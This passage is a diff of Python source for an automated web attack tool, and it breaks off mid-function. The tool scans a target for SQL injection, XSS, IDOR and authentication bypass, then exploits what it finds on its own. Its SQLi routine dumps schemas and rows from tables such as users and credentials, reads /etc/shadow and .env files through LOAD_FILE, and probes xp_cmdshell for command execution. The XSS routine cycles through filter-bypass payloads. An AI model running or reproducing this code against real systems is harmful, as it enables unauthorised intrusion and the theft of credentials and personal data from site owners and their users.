+                    print(f"       DB: {C.M}{', '.join(p['db'])}{C.X}")
+                if "context" in r:
+                    print(f"       Context: {C.M}{r['context']}{C.X}")
+                if "score" in p:
+                    print(f"       Confidence: {C.G}{p['score']}/10{C.X}")
+    cr=sum(1 for r in results if r.get("severity")=="critical")
+    hi=sum(1 for r in results if r.get("severity")=="high")
+    me=sum(1 for r in results if r.get("severity")=="medium")
+    lo=sum(1 for r in results if r.get("severity")=="low")
+    verified=sum(1 for r in results if len(r.get("proofs",[]))>=2)
+    print(f"\n{C.BO}  Summary:{C.X}")
+    print(f"  {C.R}Critical: {cr}{C.X}  {C.R}High: {hi}{C.X}  {C.Y}Medium: {me}{C.X}  {C.G}Low: {lo}{C.X}  {C.BO}Total: {len(results)}{C.X}  {C.G}Verified: {verified}{C.X}\n")
+
+def s_sqli(url,method="GET",param=None):
+    rs=[]
+    inf(f"Scanning SQLi on: {C.BO}{url}{C.X}")
+    print(f"{C.D}{'─'*70}{C.X}")
+    bl=multi_baseline(url,method,3)
+    if not bl:
+        err("  Cannot establish baseline"); return rs
+    inf(f"  Baseline: {bl['avg_l']:.0f} bytes | {bl['avg_t']:.2f}s (±{bl['std_t']:.2f})")
+    confirmed_payloads=set()
+    sts=[("error-based",SQLI["error"]),("basic",SQLI["basic"]),
+         ("union-based",SQLI["union"]),("time-based",SQLI["time"]),
+         ("blind",SQLI["blind"]),("waf-bypass",SQLI["waf"]),
+         ("polyglot",SQLI["polyglot"]),("stacked",SQLI["stacked"]),
+         ("json-sqli",SQLI["json"]),("second-order",SQLI["second_order"]),
+         ("oob",SQLI["oob"]),("graphql",SQLI["graphql"]),
+         ("jwt",SQLI["jwt"]),("lfi",SQLI["lfi"])]
+    tot=sum(len(p) for _,p in sts); cnt=0
+    for vt,pls in sts:
+        inf(f"  Testing {vt}...")
+        for pl in pls:
+            cnt+=1
+            print(f"\r{C.D}    [{cnt}/{tot}] {vt}...{C.X}",end="",flush=True)
+            r=tpay(url,pl,method,param)
+            if not r: continue
+            er=det_err(r["c"])
+            proofs=[]
+            vuln=False
+            if er:
+                db=list(set(e["d"] for e in er))
+                proofs.append({"method":"error-based","db":db,
+                               "evidence":f"{len(er)} error patterns matched"})
+                bv=bool_verify(url,
+                    "' AND '1'='1",
+                    "' AND '1'='2",method,param)
+                if bv and bv["confirmed"]:
+                    proofs.append({"method":"boolean-verify","score":bv["score"],
+                        "evidence":f"TRUE/FALSE diff: len={bv['diff']['len_diff']}, hash={bv['diff']['hash_diff']}"})
+                vuln=True
+            elif "time" in vt:
+                tv=time_verify(url,pl,bl["avg_t"],bl["std_t"],method,param,3)
+                if tv and tv["confirmed"]:
+                    proofs.append({"method":"statistical-timing","avg":f"{tv['avg']:.2f}s",
+                        "deviation":f"{tv['deviation']:.1f}σ",
+                        "evidence":f"avg={tv['avg']:.2f}s vs base={bl['avg_t']:.2f}s"})
+                    vuln=True
+            elif "blind" in vt or "basic" in vt:
+                rhash=content_hash(r["c"])
+                rtags=extract_structure(r["c"])
+                len_diff=abs(r["l"]-bl["avg_l"])
+                tag_diff=len(set(rtags[0])-set(bl["tags"][0]))
+                spread=bl.get("spread",0)
+                noise_margin=max(spread*1.5,30)
+                if rhash!=bl["hash"] and len_diff>100 and len_diff>noise_margin and not is_error_page(r["c"],r["s"]):
+                    bv=bool_verify(url,"' AND '1'='1","' AND '1'='2",method,param)
+                    if bv and bv["confirmed"]:
+                        proofs.append({"method":"boolean-verify","score":bv["score"],
+                            "evidence":f"hash+bool (score={bv['score']})"})
+                        vuln=True
+                    elif len_diff>200 and len_diff>noise_margin*1.5 or tag_diff>5:
+                        proofs.append({"method":"content-diff","len_diff":len_diff,
+                            "evidence":f"len={len_diff}, tags={tag_diff}, spread={spread}"})
+                        vuln=True
+            if vuln and proofs:
+                confirmed_payloads.add(pl)
+                all_db=sum([p.get("db",[]) for p in proofs if "db" in p],[])
+                vln(f"  {vt}: {C.Y}{pl[:50]}{C.X}")
+                for p in proofs:
+                    inf(f"    Proof [{p['method']}]: {C.M}{p['evidence']}{C.X}")
+                sv="critical" if any("union" in p["method"] or "error" in p["method"] or "boolean" in p["method"] for p in proofs) else "high"
+                rs.append({"type":f"SQLi ({vt})","severity":sv,
+                           "param":param or "N/A","payload":pl,"status":r["s"],
+                           "db":all_db,"proofs":proofs})
+    print(f"\r{' '*70}\r",end="")
+    if rs:
+        seen=set()
+        deduped=[]
+        for r in rs:
+            sig=(r["type"],r.get("severity"))
+            if sig in seen: continue
+            seen.add(sig)
+            deduped.append(r)
+        rs=deduped
+        inf("  Union verification...")
+        uv=union_verify(url,[],method,param)
+        if uv["confirmed"]:
+            vln(f"  Union confirmed: {uv['columns']} cols, marker found")
+            rs.append({"type":"SQLi (union-verified)","severity":"critical",
+                       "param":param or "N/A","payload":uv.get("payload",""),
+                       "status":200,"proofs":[{"method":"union-marker",
+                       "evidence":f"marker={uv['marker']}, cols={uv['columns']}"}]})
+        inf(f"  {C.R}Exploiting SQLi...{C.X}")
+        exp_data=exp_sqli(url,method,param,rs)
+        for r in rs: r["exploit"]=exp_data
+    return rs
+
+def s_xss(url,method="GET",param=None):
+    rs=[]
+    inf(f"Scanning XSS on: {C.BO}{url}{C.X}")
+    print(f"{C.D}{'─'*70}{C.X}")
+    sts=[("reflected",XSS["reflected"]),("events",XSS["events"]),
+         ("waf-bypass",XSS["waf"]),("dom",XSS["dom"]),
+         ("polyglot",XSS["polyglot"]),("svg",XSS["svg"]),
+         ("csp-bypass",XSS["csp"]),("framework",XSS["framework"]),
+         ("mutation",XSS["mutation"]),("import",XSS["import"])]
+    tot=sum(len(p) for _,p in sts); cnt=0
+    for sn,pls in sts:
+        inf(f"  Testing {sn}...")
+        for pl in pls:
+            cnt+=1
+            print(f"\r{C.D}    [{cnt}/{tot}] {sn}...{C.X}",end="",flush=True)
+            r=tpay(url,pl,method,param)
+            if not r: continue
+            xf=det_xss(r["c"],pl)
+            if xf:
+                ctxs=xss_context(r["c"],pl)
+                safe_ctxs=[c for c in ctxs if c["safe"]]
+                if safe_ctxs:
+                    proofs=[]
+                    proofs.append({"method":"reflection","evidence":
+                        f"Payload reflected in {safe_ctxs[0]['type']} context: {safe_ctxs[0]['desc']}"})
+                    multi=xss_multi_verify(url,pl,method,param)
+                    for m in multi:
+                        proofs.append({"method":m["method"],
+                            "evidence":m.get("evidence",m.get("sink","Verified via "+m["method"]))})
+                    vln(f"  {sn}: {C.Y}{pl[:50]}{C.X}")
+                    for p in proofs:
+                        inf(f"    Proof [{p['method']}]: {C.M}{p['evidence']}{C.X}")
+                    sv="critical" if any("document.cookie" in str(p) or "session" in str(p) for p in proofs) else \
+                       "high" if safe_ctxs else "medium"
+                    rs.append({"type":f"XSS ({sn})","severity":sv,
+                               "param":param or "N/A","payload":pl[:60],
+                               "status":r["s"],"proofs":proofs,
+                               "context":safe_ctxs[0]["type"]})
+                else:
+                    pc=re.sub(r'[<>"\'=;/\\]','',pl)
+                    if pc and len(pc)>3 and pc[:15] in r["c"]:
+                        proofs=[{"method":"partial-reflection",
+                                 "evidence":"Payload partially reflected (sanitized but present)"}]
+                        vln(f"  {sn} (partial): {C.Y}{pl[:50]}{C.X}")
+                        for p in proofs:
+                            inf(f"    Proof [{p['method']}]: {C.M}{p['evidence']}{C.X}")
+                        rs.append({"type":f"XSS ({sn}, partial)","severity":"medium",
+                                   "param":param or "N/A","payload":pl[:60],
+                                   "status":r["s"],"proofs":proofs,"context":"sanitized"})
+    print(f"\r{' '*70}\r",end="")
+    if rs:
+        inf(f"  {C.R}Exploiting XSS...{C.X}")
+        exp_data=exp_xss(url,method,param,rs)
+        for r in rs: r["exploit"]=exp_data
+    return rs
+
+def s_idor(url,method="GET"):
+    rs=[]
+    inf(f"Scanning IDOR on: {C.BO}{url}{C.X}")
+    print(f"{C.D}{'─'*70}{C.X}")
+    ps=urlparse(url)
+    pq=parse_qs(ps.query)
+
+    br=req(url,stealth=False)
+    if br.get("e"):
+        err(f"  Cannot reach target: {br['e']}")
+        return rs
+    bhash=content_hash(br["c"])
+    btags,battrs=extract_structure(br["c"])
+    blen=br["l"]
+    berr=is_error_page(br["c"],br["s"])
+    binf=is_data_page(br["c"],br["s"])
+    inf(f"  Baseline: {blen} bytes | hash={bhash[:8]}... | error={berr} | data={binf}")
+
+    def check_idor(test_url,label,test_resp,sev_base="high",extra=""):
+        if test_resp.get("e"): return
+        thash=content_hash(test_resp["c"])
+        ttags,tattrs=extract_structure(test_resp["c"])
+        terr=is_error_page(test_resp["c"],test_resp["s"])
+        tinf=is_data_page(test_resp["c"],test_resp["s"])
+        sim=similarity(br["c"],test_resp["c"])
+        diff_len=abs(test_resp["l"]-blen)
+        new_tags=set(ttags)-set(btags)
+        new_attrs=set(tattrs)-set(battrs)
+        vuln=False
+        reasons=[]
+        if thash!=bhash and not terr and tinf:
+            vuln=True; reasons.append("different content hash + data detected")
+        if sim<0.8 and tinf and not terr:
+            vuln=True; reasons.append(f"low similarity ({sim:.0%}) + data page")
+        if diff_len>200 and test_resp["s"]==200 and not terr and tinf:
+            vuln=True; reasons.append(f"significant length diff ({diff_len})")
+        if len(new_tags)>5 and not terr:
+            vuln=True; reasons.append(f"new HTML structure ({len(new_tags)} new tags)")
+        if test_resp["s"]==200 and berr and tinf:
+            vuln=True; reasons.append("base=error, test=data")
+        if test_resp["s"]==200 and test_resp["l"]>blen*1.5 and not terr:
+            vuln=True; reasons.append(f"response much larger ({test_resp['l']} vs {blen})")
+        if len(new_attrs)>3 and "token" not in " ".join(new_attrs).lower():
+            vuln=True; reasons.append(f"new attributes detected ({len(new_attrs)})")
+        if vuln:
+            sev="critical" if tinf and (diff_len>500 or len(new_tags)>10) else sev_base
+            vln(f"  IDOR {label}: {C.Y}{extra}{C.X}")
+            for r in reasons:
+                inf(f"    Reason: {C.M}{r}{C.X}")
+            inf(f"    Status: {test_resp['s']} | Length: {test_resp['l']} | Sim: {sim:.0%} | Hash: {thash[:8]}...")
+            rs.append({"type":"IDOR","severity":sev,"param":label,
+                       "payload":test_url if len(test_url)<200 else test_url[:200],
+                       "status":test_resp["s"]})
+
+    # 1. Query parameter IDOR
+    ip=[k for k in pq if any(x in k.lower() for x in IDOR_NAMES)]
+    if not ip:
+        ip=list(pq.keys())
+    for ip2 in ip:
+        inf(f"  Testing param: {C.BO}{ip2}{C.X}")
+        ov=pq[ip2][0] if ip2 in pq else None
+        tids=gen_test_ids(ov)
+        for v in tids:
+            if ov and v==ov: continue
+            tp=dict(pq); tp[ip2]=[v]
+            tu=f"{ps.scheme}://{ps.netloc}{ps.path}?{urllib.parse.urlencode(tp,doseq=True)}"
+            rr=req(tu)
+            check_idor(tu,f"param[{ip2}]={v}",rr,extra=f"{ip2}={v}")
+        if ov:
+            for enc_v in gen_encoded(ov)[:3]:
+                tp=dict(pq); tp[ip2]=[enc_v]
+                tu=f"{ps.scheme}://{ps.netloc}{ps.path}?{urllib.parse.urlencode(tp,doseq=True)}"
+                rr=req(tu)
+                check_idor(tu,f"param[{ip2}][encoded]",rr,extra=f"{ip2}={enc_v[:30]}")
+
+    # 2. Path-based IDOR (numeric IDs in URL)
+    for m in PATH_ID_RE.finditer(ps.path):
+        orig_val=m.group(1)
+        inf(f"  Testing path ID: {C.BO}{orig_val}{C.X}")
+        for nv in gen_test_ids(orig_val):
+            if nv==orig_val: continue
+            np=ps.path.replace(f"/{orig_val}",f"/{nv}",1)
+            tu=f"{ps.scheme}://{ps.netloc}{np}"
+            if ps.query: tu+=f"?{ps.query}"
+            rr=req(tu)
+            check_idor(tu,f"path[{orig_val}]={nv}",rr,extra=f"/{nv}")
+
+    # 3. Path-based IDOR (UUID in URL)
+    for m in PATH_UUID_RE.finditer(ps.path):
+        orig_uuid=m.group(1)
+        inf(f"  Testing path UUID: {C.BO}{orig_uuid[:8]}...{C.X}")
+        for nu in gen_test_uuids(orig_uuid):
+            np=ps.path.replace(f"/{orig_uuid}",f"/{nu}",1)
+            tu=f"{ps.scheme}://{ps.netloc}{np}"
+            if ps.query: tu+=f"?{ps.query}"
+            rr=req(tu)
+            check_idor(tu,"path[UUID]",rr,extra=f"/{nu[:8]}...")
+
+    # 4. Path-based IDOR (hash/token in URL)
+    for m in PATH_HASH_RE.finditer(ps.path):
+        orig_hash=m.group(1)
+        inf(f"  Testing path hash: {C.BO}{orig_hash[:16]}...{C.X}")
+        for _ in range(5):
+            fake_h=hashlib.sha256(str(random.randint(0,999999)).encode()).hexdigest()[:len(orig_hash)]
+            np=ps.path.replace(f"/{orig_hash}",f"/{fake_h}",1)
+            tu=f"{ps.scheme}://{ps.netloc}{np}"
+            if ps.query: tu+=f"?{ps.query}"
+            rr=req(tu)
+            check_idor(tu,"path[hash]",rr,extra=f"/{fake_h[:16]}...")
+
+    # 5. Header-based IDOR
+    inf("  Testing header-based IDOR...")
+    test_ids_hdr=["1","2","0","999","1337","100"]
+    for hname in IDOR_HEADERS:
+        for tid in test_ids_hdr:
+            hh=dict(st.hdrs)
+            hh[hname]=tid
+            old_hdrs=st.hdrs
+            st.hdrs=hh
+            rr=req(url)
+            st.hdrs=old_hdrs
+            check_idor(url,f"header[{hname}]={tid}",rr,extra=f"{hname}: {tid}")
+
+    # 6. Cookie-based IDOR
+    inf("  Testing cookie-based IDOR...")
+    cookie_id_names=["user_id","uid","session_user","userid","account_id","member_id",
+                     "customer_id","client_id","profile_id","admin_id","logged_in_id",
+                     "auth_id","identity","user","id","current_user"]
+    for cn in cookie_id_names:
+        for tid in ["1","2","0","999","1337"]:
+            old_ck=dict(st.cookies)
+            st.cookies[cn]=tid
+            rr=req(url)
+            st.cookies=old_ck
+            check_idor(url,f"cookie[{cn}]={tid}",rr,extra=f"Cookie: {cn}={tid}")
+
+    # 7. API endpoint probing
+    api_paths=detect_api_paths(url)
+    if api_paths:
+        inf("  Testing API endpoints...")
+        for ap in api_paths:
+            for rid in ["1","2","3"]:
+                ep=f"{ps.scheme}://{ps.netloc}{ap.rstrip('/')}/{rid}"
+                rr=req(ep)
+                if rr.get("e"): continue
+                if rr["s"]==200 and rr["l"]>100:
+                    check_idor(ep,f"api[{ap}/{rid}]",rr,extra=ep)
+
+    print(f"\r{' '*70}\r",end="")
+    if rs:
+        inf(f"  {C.R}Exploiting IDOR...{C.X}")
+        exp_data=exp_idor(url,method)
+        for r in rs: r["exploit"]=exp_data
+    return rs
+
+def s_auth(url):
+    rs=[]
+    inf(f"Scanning auth bypass on: {C.BO}{url}{C.X}")
+    print(f"{C.D}{'─'*70}{C.X}")
+    req(url,method="POST",data={"username":"user","password":"wrongpassword123"},stealth=False)
+    lf=[{"username":"user","password":"pass"},{"user":"user","pass":"pass"},
+        {"login":"user","password":"pass"},{"email":"user","password":"pass"},
+        {"username":"user","password":"pass"},{"email":"user@user.com","password":"pass"}]
+    for pl in SQLI["auth"]:
+        for fd in lf:
+            dt={k:pl if k in ["username","user","login","email"] else v for k,v in fd.items()}
+            pre_cookies=dict(st.all_cookies())
+            rr=req(url,method="POST",data=dt)
+            if rr and not rr.get("e") and rr["s"] in [200,302,301]:
+                proofs=auth_verify(url,dt,rr,pre_cookies)
+                if len(proofs)>=2:
+                    vln(f"  Auth bypass: {C.Y}{pl}{C.X}")
+                    for p in proofs:
+                        inf(f"    Proof [{p['method']}]: {C.M}{p['evidence']}{C.X}")
+                    rs.append({"type":"Auth Bypass","severity":"critical",
+                               "param":"N/A","payload":pl,"status":rr["s"],
+                               "proofs":proofs})
+                    break
+        else: continue
+        break
+    print(f"\r{' '*70}\r",end="")
+    if rs:
+        inf(f"  {C.R}Exploiting Auth Bypass...{C.X}")
+        exp_data=exp_auth(url)
+        for r in rs: r["exploit"]=exp_data
+    return rs
+
+def fp(url):
+    inf(f"Fingerprinting: {C.BO}{url}{C.X}")
+    rr=gbase(url)
+    if rr.get("e"): err(f"  Cannot reach: {rr['e']}"); return{}
+    fp={"server":rr["h"].get("Server",""),"powered":rr["h"].get("X-Powered-By",""),"cms":det_cms(rr["c"]),"waf":det_waf(rr["c"],rr["h"],rr["s"])}
+    inf(f"  Status: {rr['s']} | Length: {rr['l']} | Time: {rr['t']:.2f}s")
+    if fp["server"]: inf(f"  Server: {fp['server']}")
+    if fp["powered"]: inf(f"  X-Powered-By: {fp['powered']}")
+    if fp["cms"]: inf(f"  CMS: {', '.join(fp['cms'])}")
+    if fp["waf"]:
+        for w in fp["waf"]: wrn(f"  WAF: {w}")
+    return fp
+
+def auto(url):
+    rs=[]
+    print(f"\n{C.BO}{C.B}{'═'*70}{C.X}")
+    print(f"{C.BO}{C.CY}  Target: {C.W}{url}{C.X}")
+    print(f"{C.BO}{C.CY}  Time:   {C.W}{time.strftime('%Y-%m-%d %H:%M:%S')}{C.X}")
+    print(f"{C.BO}{C.B}{'═'*70}{C.X}\n")
+    fp2=fp(url)
+    if st.req_count<=1:
+        st.pre_browse(url)
+    ps=eparams(url); tp=ps if ps else [None]
+    for p in tp:
+        if p: inf(f"Parameter: {C.M}{p}{C.X}")
+        rs.extend(s_sqli(url,param=p))
+        rs.extend(s_xss(url,param=p))
+        rs.extend(s_extra(url,param=p))
+    rs.extend(s_idor(url))
+    rs.extend(s_auth(url))
+    return rs,fp2
+
+def exp_sqli(url,method="GET",param=None,found=None):
+    print(f"\n{C.BO}{C.R}{'═'*70}{C.X}")
+    print(f"{C.BO}{C.R}  SQLi Exploitation{C.X}")
+    print(f"{C.BO}{C.R}{'═'*70}{C.X}\n")
+
+    def try_pl(pl):
+        r=tpay(url,pl,method,param)
+        return r if r and not r.get("e") else None
+
+    def find_cols():
+        for n in range(1,21):
+            r=try_pl(f"' ORDER BY {n} --")
+            if not r: continue
+            if det_err(r["c"]) or r["s"]==500: return n-1
+        return None
+
+    def u_extract(payload,marker="ALFARZDQ"):
+        r=try_pl(payload)
+        if not r: return None
+        i=r["c"].find(marker)
+        if i==-1: return None
+        j=r["c"].find(marker,i+len(marker))
+        return r["c"][i+len(marker):j].strip() if j!=-1 else r["c"][i:i+200]
+
+    def blind_extract(query,max_len=60):
+        result=""
+        true_r=try_pl("' AND 1=1 --")
+        false_r=try_pl("' AND 1=2 --")
+        if not true_r or not false_r: return ""
+        true_l, false_l = true_r["l"], false_r["l"]
+        if true_l==false_l:
+            true_r=try_pl("' AND 'a'='a' --")
+            false_r=try_pl("' AND 'a'='b' --")
+            if true_r and false_r: true_l, false_l = true_r["l"], false_r["l"]
+            else: return ""
+        for pos in range(1,max_len+1):
+            low,high=32,126
+            ch=None
+            for _ in range(7):
+                mid=(low+high)//2
+                r=try_pl(f"' AND ASCII(SUBSTRING(({query}),{pos},1))>{mid} --")
+                if r and abs(r["l"]-true_l)<abs(r["l"]-false_l):
+                    low=mid+1
+                else:
+                    high=mid
+            if low==high and 32<=low<=126:
+                ch=chr(low)
+                result+=ch
+                print(f"\r    {C.G}Extracting: {C.X}{result}",end="",flush=True)
+            else:
+                break
+        print()
+        return result
+
+    def error_extract(query):
+        r=try_pl(f"' AND 1=CONVERT(int,({query})) --")
+        if r:
+            er=det_err(r["c"])
+            if er: return r["c"][:300]
+        r=try_pl(f"' AND EXTRACTVALUE(1,CONCAT(0x7e,({query}))) --")
+        if r:
+            m=re.search(r'XPATH[^:]*:\s*(.+?)(?:</|$)',r["c"])
+            if m: return m.group(1)
+        r=try_pl(f"' AND UPDATEXML(1,CONCAT(0x7e,({query})),1) --")
+        if r:
+            m=re.search(r'XPATH[^:]*:\s*(.+?)(?:</|$)',r["c"])
+            if m: return m.group(1)
+        return None
+
+    def dump_table(db,table,columns,limit=20):
+        rows=[]
+        nulls=",".join(["NULL"]*max(cols-1,0)) if cols else ""
+        concat="CONCAT(0x414c46,'||',"+",".join(f"'{c}:',IFNULL({c},'NULL'),','" for c in columns)+",'||',0x414c46)"
+        if cols:
+            pl=f"' UNION SELECT {concat},{nulls} FROM {db}.{table if db else table} LIMIT {limit} --"
+        else:
+            pl=f"' UNION SELECT {concat} FROM {db}.{table if db else table} LIMIT {limit} --"
+        r=try_pl(pl)
+        if r:
+            for block in re.finditer(r'ALF\|\|(.+?)\|\|ALF',r["c"]):
+                row={}
+                for pair in block.group(1).split(","):
+                    if ":" in pair:
+                        k,v=pair.split(":",1)
+                        row[k.strip()]=v.strip()
+                if row: rows.append(row)
+        if not rows:
+            for block in re.finditer(r'~([^~]{5,300})~',r["c"] if r else ""):
+                row={"data":block.group(1)}
+                rows.append(row)
+        return rows
+
+    cols=find_cols() or 0
+    if cols: ok(f"  Columns: {C.BO}{cols}{C.X}")
+    else: inf("  Column count unknown, using fallback methods")
+
+    print(f"\n  {C.BO}{C.Y}[1/6] Version & Database{C.X}")
+    db_info={}
+    if cols:
+        for pl in [f"' UNION SELECT @@version,{','.join(['NULL']*(cols-1))} --",
+                   f"' UNION SELECT {','.join(['NULL']*(cols-1))},@@version --"]:
+            r=try_pl(pl)
+            if r:
+                m=re.search(r'(\d+\.\d+\.\d+[^\s<"]{0,30})',r["c"])
+                if m: db_info["version"]=m.group(1); break
+    if not db_info.get("version"):
+        v=error_extract("SELECT @@version")
+        if v: db_info["version"]=v[:100]
+    if not db_info.get("version"):
+        v=blind_extract("SELECT @@version")
+        if v: db_info["version"]=v
+
+    for target in ["database()","user()","@@hostname","@@datadir"]:
+        if cols:
+            for pl in [f"' UNION SELECT {target},{','.join(['NULL']*(cols-1))} --",
+                       f"' UNION SELECT {','.join(['NULL']*(cols-1))},{target} --"]:
+                r=try_pl(pl)
+                if r:
+                    m=re.search(r'(?<![a-zA-Z0-9_])([a-zA-Z0-9_./@-]{3,50})(?![a-zA-Z0-9_])',r["c"])
+                    if m and m.group(1) not in ["NULL","null","select","UNION"]:
+                        db_info[target.replace("@","").replace("()","")]=m.group(1); break
+        if target.replace("@","").replace("()","") not in db_info:
+            v=blind_extract(f"SELECT {target}")
+            if v: db_info[target.replace("@","").replace("()","")]=v
+
+    for k,v in db_info.items():
+        ok(f"  {k}: {C.BO}{C.G}{v}{C.X}")
+
+    print(f"\n  {C.BO}{C.Y}[2/6] Schema Discovery{C.X}")
+    schemas=[]
+    tables=[]
+    if cols:
+        pl=f"' UNION SELECT GROUP_CONCAT(schema_name),{','.join(['NULL']*(cols-1))} FROM information_schema.schemata --"
+        r=try_pl(pl)
+        if r:
+            schemas=[s.strip() for s in r["c"].split(",") if len(s.strip())>2 and s.strip().lower() not in ["null","select","from","information_schema"]]
+            schemas=[s for s in schemas if re.match(r'^[a-zA-Z_][a-zA-Z0-9_]*$',s)]
+    if not schemas:
+        v=blind_extract("SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata")
+        if v: schemas=[s.strip() for s in v.split(",") if s.strip()]
+    if schemas:
+        ok(f"  Schemas: {C.BO}{', '.join(schemas[:15])}{C.X}")
+
+    target_db=db_info.get("database","") or (schemas[0] if schemas else "")
+    if cols:
+        pl=f"' UNION SELECT GROUP_CONCAT(table_name),{','.join(['NULL']*(cols-1))} FROM information_schema.tables WHERE table_schema='{target_db}' --"
+        if not target_db: pl=f"' UNION SELECT GROUP_CONCAT(table_name),{','.join(['NULL']*(cols-1))} FROM information_schema.tables WHERE table_schema=database() --"
+        r=try_pl(pl)
+        if r:
+            tables=[t.strip() for t in r["c"].split(",") if len(t.strip())>2 and t.strip().lower() not in ["null","select","from","group_concat"]]
+            tables=[t for t in tables if re.match(r'^[a-zA-Z_][a-zA-Z0-9_]*$',t)]
+    if not tables:
+        v=blind_extract("SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()")
+        if v: tables=[t.strip() for t in v.split(",") if t.strip()]
+    if tables:
+        ok(f"  Tables ({len(tables)}):")
+        for t in tables[:25]: print(f"    {C.G}*{C.X} {t}")
+
+    print(f"\n  {C.BO}{C.Y}[3/6] Interesting Table Hunt{C.X}")
+    interesting=["users","accounts","members","customers","admins","employees",
+                 "login","credentials","passwords","profiles","orders","transactions",
+                 "payments","sessions","tokens","api_keys","config","settings"]
+    target_table=None
+    for it in interesting:
+        if any(it==t.lower() for t in tables):
+            target_table=[t for t in tables if t.lower()==it][0]
+            break
+    if not target_table and tables: target_table=tables[0]
+
+    col_names=[]
+    if target_table:
+        ok(f"  Target: {C.BO}{target_table}{C.X}")
+        if cols:
+            pl=f"' UNION SELECT GROUP_CONCAT(column_name),{','.join(['NULL']*(cols-1))} FROM information_schema.columns WHERE table_name='{target_table}' --"
+            r=try_pl(pl)
+            if r:
+                col_names=[c.strip() for c in r["c"].split(",") if len(c.strip())>2 and c.strip().lower() not in ["null","select","from"]]
+                col_names=[c for c in col_names if re.match(r'^[a-zA-Z_][a-zA-Z0-9_]*$',c)]
+        if not col_names:
+            v=blind_extract(f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{target_table}'")
+            if v: col_names=[c.strip() for c in v.split(",") if c.strip()]
+        if col_names:
+            ok(f"  Columns: {', '.join(col_names[:15])}")
+
+    print(f"\n  {C.BO}{C.Y}[4/6] Data Dump{C.X}")
+    dumped_rows=[]
+    if target_table and col_names and cols:
+        rows=dump_table(target_db,target_table,col_names,20)
+        if rows:
+            ok(f"  {len(rows)} rows from {target_table}:")
+            for row in rows[:20]:
+                line=" | ".join(f"{k}={v}" for k,v in row.items())
+                print(f"    {C.R}{line[:120]}{C.X}")
+                dumped_rows.append(row)
+    if not dumped_rows and target_table and cols:
+        data_cols=[c for c in col_names if c.lower() in ["password","pass","pwd","hash","token",
+                   "secret","email","username","name","phone","credit_card","ssn","salary","balance","id"]]
+        if not data_cols: data_cols=col_names[:3]
+        for dc in data_cols[:3]:
+            pl=f"' UNION SELECT {dc},{','.join(['NULL']*(cols-1))} FROM {target_db+'.' if target_db else ''}{target_table} LIMIT 10 --"
+            r=try_pl(pl)
+            if r:
+                vals=re.findall(r'(?<![a-zA-Z0-9_$])([a-zA-Z0-9._%+-]{4,80})(?![a-zA-Z0-9_])',r["c"])
+                vals=[v for v in vals if v.lower() not in ["null","select","union","from","where","and","table","none","limit"]]
+                if vals:
+                    ok(f"  {dc}: {', '.join(vals[:10])}")
+                    dumped_rows.append({dc:vals})
+    if not dumped_rows and target_table:
+        for dc in col_names[:3]:
+            v=blind_extract(f"SELECT {dc} FROM {target_table} LIMIT 1")
+            if v: ok(f"  {dc} (blind): {C.R}{v}{C.X}"); dumped_rows.append({dc:v})
+
+    print(f"\n  {C.BO}{C.Y}[5/6] File Read / Stacked Queries{C.X}")
+    file_contents=[]
+    for fpath in ["/etc/passwd","/etc/shadow","/proc/self/environ","/var/www/html/.env","/app/.env"]:
+        if cols:
+            pl=f"' UNION SELECT LOAD_FILE('{fpath}'),{','.join(['NULL']*(cols-1))} --"
+            r=try_pl(pl)
+            if r and ("root:" in r["c"] or "SECRET" in r["c"] or "DB_" in r["c"] or "APP_" in r["c"] or "PASSWORD" in r["c"].upper()):
+                content=r["c"][:500]
+                ok(f"  {fpath}:")
+                print(f"    {C.R}{content}{C.X}")
+                file_contents.append({"path":fpath,"content":content})
+                break
+    if not file_contents:
+        v=blind_extract("SELECT LOAD_FILE('/etc/passwd')",30)
+        if v and "root" in v:
+            ok(f"  /etc/passwd (blind): {C.R}{v}{C.X}")
+            file_contents.append({"path":"/etc/passwd","content":v})
+    r=try_pl("'; SELECT SLEEP(1) --")
+    if r and r["t"]>=1.5:
+        ok(f"  {C.R}Stacked queries supported!{C.X}")
+    r=try_pl("'; EXEC xp_cmdshell('echo ALFARZDQ') --")
+    if r and "ALFARZDQ" in r.get("c",""):
+        ok(f"  {C.R}OS command execution via xp_cmdshell!{C.X}")
+
+    print(f"\n  {C.BO}{C.Y}[6/6] Report{C.X}")
+    print(f"  {C.D}{'─'*50}{C.X}")
+    ok(f"  DB Version: {db_info.get('version','unknown')}")
+    ok(f"  Database: {db_info.get('database','unknown')}")
+    ok(f"  User: {db_info.get('user','unknown')}")
+    if schemas: ok(f"  Schemas: {len(schemas)}")
+    if tables: ok(f"  Tables: {len(tables)}")
+    if dumped_rows: ok(f"  Rows dumped: {len(dumped_rows)}")
+    if file_contents: ok(f"  Files read: {len(file_contents)}")
+
+    print(f"\n{C.BO}{C.G}  [!] SQLi Exploit Done{C.X}\n")
+    return{"db_info":db_info,"schemas":schemas,"tables":tables,"rows":dumped_rows,"files":file_contents}
+
+def exp_xss(url,method="GET",param=None,found=None):
+    print(f"\n{C.BO}{C.R}{'═'*70}{C.X}")
+    print(f"{C.BO}{C.R}  XSS Exploitation{C.X}")
+    print(f"{C.BO}{C.R}{'═'*70}{C.X}\n")
+
+    marker=f"ALFXSS{random.randint(10000,99999)}"
+
+    print(f"  {C.BO}{C.Y}[1/4] Finding Working Payload{C.X}")
+    working_pl=None
+    working_ctx=None
+    test_pls=[
+        f"<script>document.write('{marker}')</script>",
+        f"<img src=x onerror=document.write('{marker}')>",
+        f"<svg onload=document.write('{marker}')>",
+        f"'><script>document.write('{marker}')</script>//",
+        f"\"><img src=x onerror=document.write('{marker}')>",
+        f"<body onload=document.write('{marker}')>",
+        f"<details open ontoggle=document.write('{marker}')>",
+        f"<marquee onstart=document.write('{marker}')>",
+        f"<input onfocus=document.write('{marker}') autofocus>",
+        f"<video><source onerror=document.write('{marker}')>",
+        f"<select onchange=document.write('{marker}') autofocus><option>1</option></select>",
+    ]
+    for pl in test_pls:
+        r=tpay(url,pl,method,param)
+        if r and marker in r["c"]:
+            working_pl=pl
+            ctxs=xss_context(r["c"],marker)
+            working_ctx=ctxs[0] if ctxs else {"type":"unknown","safe":True}
+            ok(f"  Working: {C.BO}{pl[:60]}{C.X}")
+            ok(f"  Context: {working_ctx['desc']}")
+            break
+    if not working_pl:
+        wrn("  Direct payloads filtered, trying bypasses...")
+        for pl in test_pls[:5]:
